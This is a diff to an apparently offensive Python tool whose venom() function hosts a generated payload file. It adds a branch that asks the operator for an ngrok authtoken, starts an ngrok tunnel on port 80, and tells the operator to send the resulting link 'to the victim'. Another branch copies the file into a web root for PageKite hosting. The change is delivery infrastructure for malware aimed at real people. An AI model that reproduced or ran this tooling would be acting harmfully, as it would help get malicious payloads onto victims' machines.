@@ -114,6 +114,17 @@ def venom():
                   os.system(f"./ngrok authtoken {auth}")
                   os.system("./ngrok http 80")
             
+            else:
+                  print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
+                  print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
+                  input("ENTER TO CONTINUE , LOGIN :")
+                  webbrowser.open("https://dashboard.ngrok.com/login")
+                  auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
+                  os.system(f"./ngrok authtoken {auth2}")
+                  input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
+                  input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
+                  os.system("./ngrok http 80")
+                         
       elif link==2:
            os.system(f"cp {output}/{name} /var/www/html")
            print("INSTALLING PAGEKITE FOR YOU>>>>")
